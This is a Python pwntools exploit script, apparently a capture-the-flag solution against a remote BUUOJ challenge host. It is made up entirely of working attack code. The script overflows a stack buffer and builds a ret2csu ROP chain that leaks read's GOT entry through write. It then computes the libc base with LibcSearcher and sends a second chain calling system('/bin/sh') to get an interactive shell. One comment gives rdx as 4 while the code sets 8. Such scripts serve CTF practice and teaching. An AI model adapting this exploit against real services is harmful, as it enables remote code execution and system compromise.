from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 28787)
elf = ELF('./pwn')

# gdb.attach(io)
# sleep(1)

poprdi_ret = 0x4006b3
poprsir15_ret = 0x4006b1
movrdxr13 = 0x400690
pop6_ret = 0x4006aa

payload = cyclic(128 + 8)

payload += p64(pop6_ret)
payload += p64(0)			# rbx
payload += p64(1)			# rbp
payload += p64(0x600890)	# r12
payload += p64(8)			# r13
payload += p64(elf.got['read'])	# r14
payload += p64(0)			# r15

payload += p64(movrdxr13)	# mov rdx, r13; mov rsi, r14; mov edi, r15d
# then call 'pop rdi, ret'
# payload += p64(1)
payload += p64(0) * 7

payload += p64(poprdi_ret)
payload += p64(1)
# at this time, rdi = 1, rsi = addr(got['read']), rdx = 4
payload += p64(elf.plt['write'])
payload += p64(elf.symbols['main'])

io.sendlineafter(b'Input:\n', payload)

read = u64(io.recv(8))

libc = LibcSearcher('read', read)
base = read - libc.dump('read')
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

payload = cyclic(128 + 8)
payload += p64(poprdi_ret)
payload += p64(binsh)
payload += p64(sys)

io.sendlineafter(b'Input:\n', payload)

io.interactive()